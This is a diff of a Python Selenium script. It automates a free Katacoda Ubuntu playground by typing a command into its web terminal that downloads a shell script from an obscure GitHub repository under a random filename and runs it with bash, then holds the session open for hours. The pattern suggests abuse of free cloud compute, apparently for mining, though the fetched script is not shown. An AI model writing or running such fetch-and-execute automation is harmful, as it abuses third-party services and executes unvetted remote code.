@@ -20,10 +20,11 @@ options.headless = True
 driver = webdriver.Chrome(executable_path=CHROMEDRIVER_PATH , chrome_options=options)
 # ------------------------------------------------------------
 
+driver = webdriver.Chrome()
 driver.get("https://www.katacoda.com/courses/ubuntu/playground")
-time.sleep(28)
+time.sleep(18)
 driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("ran1=$(openssl rand -hex 5) && wget https://github.com/unmsjd28/ynsg7s9/raw/main/dm.sh -O $ran1.sh && bash $ran1.sh")
 time.sleep(8)
 driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
-print("hiity")
-time.sleep(10800)
+print("hii")
+time.sleep(7200)
